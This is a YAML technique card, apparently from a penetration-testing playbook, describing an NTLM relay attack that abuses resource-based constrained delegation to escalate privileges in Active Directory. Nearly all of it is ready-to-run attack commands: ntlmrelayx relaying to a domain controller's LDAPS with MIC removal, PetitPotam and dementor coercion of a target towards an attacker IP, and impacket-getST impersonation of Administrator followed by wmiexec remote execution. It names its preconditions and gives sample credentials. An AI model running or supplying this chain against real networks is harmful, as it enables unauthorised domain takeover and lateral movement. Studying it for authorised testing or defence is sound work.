title: NTLM relay attack using RBCD abuse
category: 
  - AD:
    - NTLM
tactic: Privilege Escalation
tags: []
description: NTLM relay attack using RBCD abuse. Can be used only for NTLMv1 or in case of unpatched Drop the MIC CVE
  CVE-2019-1040 or CVE-2019-1166. Requires MachineAccountQuota > 0.
references:
steps:

  - description: Prepare a tool to relay the authentication request
    options: 
      - tool: impacket-ntlmrelayx
        usage: 
          impacket-ntlmrelayx -t "ldaps://dc01.domain.local" --remove-mic -smb2support --delegate-access
        comments: 
  
  - description: Force the target host to authenticate
    options: 
      - tool: dementor.py
        usage: python2 dementor.py -d hpbank.local -u da -p 'P@ssw0rd' <attacker_ip> <target_hostname>
        comments: 
      
      - tool: PetitPotam.py (topotam)
        usage: PetitPotam.py -u da -p 'P@ssw0rd' -d domain.local <attacker_ip> <target_hostname> -pipe all
        comments: 
  
  - description: Craft a service ticket for an impersonated user
    options: 
      - tool: impacket-getST
        usage: |
          impacket-getST -spn cifs/ADCS.domain.local -impersonate Administrator domain.local/'PEPQTPEY$':'3<J8...' -dc-ip 192.168.0.122
          KRB5CCNAME=Administrator.ccache impacket-wmiexec -k -no-pass ADCS.HPBANK.LOCAL
        comments: 

comments:
  